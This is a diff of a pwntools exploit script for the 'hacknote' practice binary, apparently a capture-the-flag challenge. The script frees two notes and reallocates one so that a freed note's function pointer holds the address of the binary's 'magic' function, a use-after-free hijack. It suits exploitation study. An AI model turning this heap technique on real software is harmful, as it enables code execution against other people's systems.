@@ -1,45 +1,34 @@
 #!/usr/bin/env python
-# -*- coding: utf-8 -*-
-
 from pwn import *
-
-r = process('./hacknote')
-
+p = process('./hacknote')
+elf = ELF('./hacknote')
 
 def addnote(size, content):
-    r.recvuntil(":")
-    r.sendline("1")
-    r.recvuntil(":")
-    r.sendline(str(size))
-    r.recvuntil(":")
-    r.sendline(content)
-
+    p.recvuntil(':')
+    p.sendline('1')
+    p.recvuntil(':')
+    p.sendline(str(size))
+    p.recvuntil(':')
+    p.sendline(content)
 
 def delnote(idx):
-    r.recvuntil(":")
-    r.sendline("2")
-    r.recvuntil(":")
-    r.sendline(str(idx))
-
+    p.recvuntil(':')
+    p.sendline('2')
+    p.recvuntil(':')
+    p.sendline(str(idx))
 
 def printnote(idx):
-    r.recvuntil(":")
-    r.sendline("3")
-    r.recvuntil(":")
-    r.sendline(str(idx))
+    p.recvuntil(':')
+    p.sendline('3')
+    p.recvuntil(':')
+    p.sendline(str(idx))
 
-
-gdb.attach(r)
-magic = 0x08048986
-
-addnote(32, "aaaa")
-addnote(32, "ddaa")
-
+# gdb.attach(p)
+magic = elf.symbols['magic']
+addnote(32, 'aaaa')
+addnote(32, 'bbbb')
 delnote(0)
 delnote(1)
-
 addnote(8, p32(magic))
-
 printnote(0)
-
-r.interactive()
+p.interactive()
